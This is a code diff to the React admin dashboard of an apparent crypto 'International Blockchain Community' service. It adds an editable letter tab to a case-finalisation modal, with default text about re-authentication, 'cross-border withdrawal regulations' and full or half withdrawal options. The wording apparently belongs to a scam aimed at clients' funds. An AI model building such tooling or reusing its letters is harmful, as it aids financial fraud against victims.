@@ -16,7 +16,7 @@ import {
   TableRow 
 } from "@/components/ui/table";
 import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle, DialogFooter } from "@/components/ui/dialog";
-import { ShieldAlert, RefreshCw, Trash2, Lock, Plus, UserCheck, FileText, FolderOpen, Edit3, History, User, LogOut, ShieldCheck, Key, ExternalLink, X, MessageCircle, Send, Bell, AlertTriangle, Clock, CheckCircle, Image, Wallet, Upload } from "lucide-react";
+import { ShieldAlert, RefreshCw, Trash2, Lock, Plus, UserCheck, FileText, FolderOpen, Edit3, History, User, Users, LogOut, ShieldCheck, Key, ExternalLink, X, MessageCircle, Send, Bell, AlertTriangle, Clock, CheckCircle, Image, Wallet, Upload } from "lucide-react";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import ibcLogo from "@assets/generated_images/professional_corporate_logo_for_international_blockchain_community.png";
 import { useToast } from "@/hooks/use-toast";
@@ -687,12 +687,37 @@ export default function AdminDashboard() {
     }
   };
 
-  const openFinalizeModal = (c: Case) => {
+  const openFinalizeModal = async (c: Case) => {
     setSelectedCase(c);
     setFinalizeData({
       ...finalizeData,
       username: c.userName || ""
     });
+    
+    // Also load letter data for editing
+    try {
+      const response = await fetch(`/api/cases/${c.id}/letter`);
+      if (response.ok) {
+        const data = await response.json();
+        if (data) {
+          setLetterData(data);
+        } else {
+          setLetterData({
+            headline: "Withdrawal Protocol Selection",
+            introduction: `Dear ${c.userName || "Client"},\n\nWe acknowledge the successful completion of your re-authentication procedure.`,
+            bodyContent: "In accordance with IBC cross-border withdrawal regulations, please review the finalised withdrawal options for your account.",
+            footerNote: "Please select your preferred option below to proceed with the withdrawal process.",
+            optionATitle: "Accelerated Release",
+            optionADescription: "Full withdrawal amount processed in accelerated batches.",
+            optionBTitle: "Standard Release",
+            optionBDescription: "Half allocation processed in standard batches."
+          });
+        }
+      }
+    } catch (error) {
+      console.error('Failed to load letter:', error);
+    }
+    
     setIsFinalizeOpen(true);
   };
 
@@ -762,6 +787,19 @@ export default function AdminDashboard() {
     if (!selectedCase) return;
     
     try {
+      // Save the letter first
+      const letterResponse = await fetch(`/api/cases/${selectedCase.id}/letter`, {
+        method: 'PUT',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(letterData)
+      });
+
+      if (!letterResponse.ok) {
+        toast({ variant: "destructive", title: "Error", description: "Failed to save letter content." });
+        return;
+      }
+
+      // Then finalize the case
       const response = await fetch(`/api/cases/${selectedCase.id}`, {
         method: 'PATCH',
         headers: { 'Content-Type': 'application/json' },
@@ -1366,71 +1404,170 @@ export default function AdminDashboard() {
         </DialogContent>
       </Dialog>
 
-      {/* Finalize Sync Modal */}
+      {/* Finalize Sync Modal with User Details & Letter Editor Tabs */}
       <Dialog open={isFinalizeOpen} onOpenChange={setIsFinalizeOpen}>
-        <DialogContent className="bg-slate-950 border-slate-800 text-slate-100">
+        <DialogContent className="bg-slate-950 border-slate-800 text-slate-100 max-w-3xl max-h-[90vh] overflow-y-auto">
           <DialogHeader>
-            <DialogTitle>Finalize Account Reactivation</DialogTitle>
+            <DialogTitle className="flex items-center gap-2">
+              <UserCheck className="w-5 h-5" /> Finalize Account Reactivation
+            </DialogTitle>
             <DialogDescription className="text-slate-400">
-              Input user details to complete synchronization.
+              Review and edit user details and letter content before activating the account.
             </DialogDescription>
           </DialogHeader>
           
-          <div className="grid gap-4 py-4">
-            <div className="grid grid-cols-2 gap-4">
-              <div className="space-y-2">
-                <Label className="text-slate-400">VIP Status</Label>
-                <Input 
-                  value={finalizeData.vipStatus}
-                  onChange={(e) => setFinalizeData({...finalizeData, vipStatus: e.target.value})}
-                  className="bg-slate-900 border-slate-700 text-white"
-                  data-testid="input-vip-status"
-                />
-              </div>
-              <div className="space-y-2">
-                <Label className="text-slate-400">Physilocal0</Label>
-                <Input 
-                  value={finalizeData.physilocal0}
-                  onChange={(e) => setFinalizeData({...finalizeData, physilocal0: e.target.value})}
-                  className="bg-slate-900 border-slate-700 text-white"
-                  data-testid="input-physilocal0"
-                />
-              </div>
-            </div>
+          <Tabs defaultValue="details" className="w-full">
+            <TabsList className="grid w-full grid-cols-2 bg-slate-900 border border-slate-800">
+              <TabsTrigger value="details" className="data-[state=active]:bg-slate-800 gap-2" data-testid="tab-finalize-details">
+                <Users className="w-4 h-4" /> User Details
+              </TabsTrigger>
+              <TabsTrigger value="letter" className="data-[state=active]:bg-slate-800 gap-2" data-testid="tab-finalize-letter">
+                <Edit3 className="w-4 h-4" /> Letter Content
+              </TabsTrigger>
+            </TabsList>
+            
+            <TabsContent value="details" className="mt-4">
+              <div className="grid gap-4">
+                <div className="grid grid-cols-2 gap-4">
+                  <div className="space-y-2">
+                    <Label className="text-slate-400">VIP Status</Label>
+                    <Input 
+                      value={finalizeData.vipStatus}
+                      onChange={(e) => setFinalizeData({...finalizeData, vipStatus: e.target.value})}
+                      className="bg-slate-900 border-slate-700 text-white"
+                      data-testid="input-vip-status"
+                    />
+                  </div>
+                  <div className="space-y-2">
+                    <Label className="text-slate-400">Physilocal0</Label>
+                    <Input 
+                      value={finalizeData.physilocal0}
+                      onChange={(e) => setFinalizeData({...finalizeData, physilocal0: e.target.value})}
+                      className="bg-slate-900 border-slate-700 text-white"
+                      data-testid="input-physilocal0"
+                    />
+                  </div>
+                </div>
 
-            <div className="space-y-2">
-              <Label className="text-slate-400">Username</Label>
-              <Input 
-                value={finalizeData.username}
-                onChange={(e) => setFinalizeData({...finalizeData, username: e.target.value})}
-                className="bg-slate-900 border-slate-700 text-white"
-                data-testid="input-username"
-              />
-            </div>
+                <div className="space-y-2">
+                  <Label className="text-slate-400">Username</Label>
+                  <Input 
+                    value={finalizeData.username}
+                    onChange={(e) => setFinalizeData({...finalizeData, username: e.target.value})}
+                    className="bg-slate-900 border-slate-700 text-white"
+                    data-testid="input-username"
+                  />
+                </div>
 
-            <div className="grid grid-cols-2 gap-4">
-              <div className="space-y-2">
-                <Label className="text-slate-400">Withdrawal Amount</Label>
-                <Input 
-                  value={finalizeData.withdrawalAmount}
-                  onChange={(e) => setFinalizeData({...finalizeData, withdrawalAmount: e.target.value})}
-                  className="bg-slate-900 border-slate-700 text-white"
-                  data-testid="input-withdrawal-amount"
-                />
+                <div className="grid grid-cols-2 gap-4">
+                  <div className="space-y-2">
+                    <Label className="text-slate-400">Withdrawal Amount</Label>
+                    <Input 
+                      value={finalizeData.withdrawalAmount}
+                      onChange={(e) => setFinalizeData({...finalizeData, withdrawalAmount: e.target.value})}
+                      className="bg-slate-900 border-slate-700 text-white"
+                      data-testid="input-withdrawal-amount"
+                    />
+                  </div>
+                  <div className="space-y-2">
+                    <Label className="text-slate-400">Batches</Label>
+                    <Input 
+                      value={finalizeData.withdrawalBatches}
+                      onChange={(e) => setFinalizeData({...finalizeData, withdrawalBatches: e.target.value})}
+                      className="bg-slate-900 border-slate-700 text-white"
+                      data-testid="input-batches"
+                    />
+                  </div>
+                </div>
               </div>
-              <div className="space-y-2">
-                <Label className="text-slate-400">Batches</Label>
-                <Input 
-                  value={finalizeData.withdrawalBatches}
-                  onChange={(e) => setFinalizeData({...finalizeData, withdrawalBatches: e.target.value})}
-                  className="bg-slate-900 border-slate-700 text-white"
-                  data-testid="input-batches"
-                />
-              </div>
-            </div>
-          </div>
+            </TabsContent>
+            
+            <TabsContent value="letter" className="mt-4">
+              <div className="grid gap-4">
+                <div className="space-y-2">
+                  <Label className="text-slate-400">Headline</Label>
+                  <Input 
+                    value={letterData.headline || ""}
+                    onChange={(e) => setLetterData({...letterData, headline: e.target.value})}
+                    className="bg-slate-900 border-slate-700 text-white"
+                    data-testid="input-finalize-letter-headline"
+                  />
+                </div>
 
-          <DialogFooter>
+                <div className="space-y-2">
+                  <Label className="text-slate-400">Introduction</Label>
+                  <Textarea 
+                    value={letterData.introduction || ""}
+                    onChange={(e) => setLetterData({...letterData, introduction: e.target.value})}
+                    className="bg-slate-900 border-slate-700 text-white min-h-[80px]"
+                    placeholder="Dear [User Name],..."
+                    data-testid="input-finalize-letter-introduction"
+                  />
+                </div>
+
+                <div className="space-y-2">
+                  <Label className="text-slate-400">Body Content</Label>
+                  <Textarea 
+                    value={letterData.bodyContent || ""}
+                    onChange={(e) => setLetterData({...letterData, bodyContent: e.target.value})}
+                    className="bg-slate-900 border-slate-700 text-white min-h-[80px]"
+                    placeholder="Main letter content..."
+                    data-testid="input-finalize-letter-body"
+                  />
+                </div>
+
+                <div className="space-y-2">
+                  <Label className="text-slate-400">Footer Note</Label>
+                  <Textarea 
+                    value={letterData.footerNote || ""}
+                    onChange={(e) => setLetterData({...letterData, footerNote: e.target.value})}
+                    className="bg-slate-900 border-slate-700 text-white min-h-[60px]"
+                    data-testid="input-finalize-letter-footer"
+                  />
+                </div>
+
+                <div className="border-t border-slate-800 pt-4">
+                  <h4 className="text-sm font-medium text-slate-300 mb-3">Option Customization</h4>
+                  <div className="grid grid-cols-2 gap-4">
+                    <div className="space-y-2">
+                      <Label className="text-slate-400">Option A Title</Label>
+                      <Input 
+                        value={letterData.optionATitle || ""}
+                        onChange={(e) => setLetterData({...letterData, optionATitle: e.target.value})}
+                        className="bg-slate-900 border-slate-700 text-white"
+                        data-testid="input-finalize-option-a-title"
+                      />
+                      <Textarea 
+                        value={letterData.optionADescription || ""}
+                        onChange={(e) => setLetterData({...letterData, optionADescription: e.target.value})}
+                        className="bg-slate-900 border-slate-700 text-white min-h-[60px]"
+                        placeholder="Option A description..."
+                        data-testid="input-finalize-option-a-desc"
+                      />
+                    </div>
+                    <div className="space-y-2">
+                      <Label className="text-slate-400">Option B Title</Label>
+                      <Input 
+                        value={letterData.optionBTitle || ""}
+                        onChange={(e) => setLetterData({...letterData, optionBTitle: e.target.value})}
+                        className="bg-slate-900 border-slate-700 text-white"
+                        data-testid="input-finalize-option-b-title"
+                      />
+                      <Textarea 
+                        value={letterData.optionBDescription || ""}
+                        onChange={(e) => setLetterData({...letterData, optionBDescription: e.target.value})}
+                        className="bg-slate-900 border-slate-700 text-white min-h-[60px]"
+                        placeholder="Option B description..."
+                        data-testid="input-finalize-option-b-desc"
+                      />
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </TabsContent>
+          </Tabs>
+
+          <DialogFooter className="mt-4">
             <Button variant="ghost" onClick={() => setIsFinalizeOpen(false)}>Cancel</Button>
             <Button onClick={handleFinalize} className="bg-green-600 hover:bg-green-700 text-white gap-2" data-testid="button-finalize-submit">
               <UserCheck className="w-4 h-4" /> Accept & Finalize
